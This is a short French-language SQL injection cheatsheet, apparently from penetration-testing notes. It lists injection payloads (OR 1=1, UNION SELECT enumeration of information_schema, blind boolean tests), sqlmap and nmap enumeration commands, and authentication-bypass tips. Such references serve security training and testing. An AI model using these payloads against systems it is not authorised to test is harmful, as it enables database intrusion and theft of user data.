---
description: Énumération SQL - Cheatsheet
---

# SQL

1. <mark style="color:yellow;">Injection SQL de base :</mark>
   * `' OR 1=1--` : Injection SQL basique pour récupérer toutes les entrées d'une requête (en commentant le reste de la requête).
   * `' UNION SELECT 1,2,3--` : Injection UNION pour extraire des données spécifiques.
2. <mark style="color:yellow;">Test des vulnérabilités d'injection SQL :</mark>
   * `sqlmap -u <URL>` : Détecter et exploiter les vulnérabilités d'injection SQL.
   * `sqlmap -r <fichier>` : Utiliser un fichier de requête pour l'injection SQL.
3. <mark style="color:yellow;">Extraction d'informations :</mark>
   * UNION SELECT : Utiliser UNION SELECT pour extraire des données d'autres tables ou colonnes.
   * VERSION() : Extraire la version de la base de données.
   * DATABASE() : Extraire le nom de la base de données courante.
4. <mark style="color:yellow;">Enumération des tables et des colonnes :</mark>
   * `' UNION SELECT table_name,1,1 FROM information_schema.tables--` : Enumérer les noms de tables.
   * `' UNION SELECT column_name,1,1 FROM information_schema.columns WHERE table_name='<table>'--` : Enumérer les noms de colonnes pour une table spécifique.
5. <mark style="color:yellow;">Récupération des données :</mark>
   * `' UNION SELECT <colonne>,<colonne>,... FROM <table>--` : Récupérer les données d'une table spécifique.
6. <mark style="color:yellow;">Requêtes aveugles (blind SQL injection) :</mark>
   * `' AND 1=1--`: Injection aveugle pour vérifier une condition vraie.
   * `' AND 1=2--` : Injection aveugle pour vérifier une condition fausse.
7. <mark style="color:yellow;">Contournement d'authentification :</mark>
   * Suppression de LIMIT : Supprimer LIMIT pour afficher plus d'entrées dans une liste d'utilisateurs.
   * Utilisation de commentaires : Utiliser /\* et \*/ pour commenter une partie de la requête et contourner les vérifications d'authentification.
8. <mark style="color:yellow;">Énumération des utilisateurs :</mark>
   * `' UNION SELECT user(),1,1--` : Afficher le nom de l'utilisateur courant.
9. <mark style="color:yellow;">Fuzzing de paramètres :</mark>
   * Utiliser des valeurs incorrectes pour les paramètres afin de générer des erreurs SQL et identifier les points d'injection.
10. <mark style="color:yellow;">Scripts Nmap pour l'énumération SQL :</mark>
    * `nmap -p 1433 --script ms-sql-info <cible>` : Découvrir les informations spécifiques aux bases de données SQL Server (port 1433).
    * `nmap -p 3306 --script mysql-databases,mysql-users <cible>` : Enumérer les bases de données et les utilisateurs MySQL (port 3306).
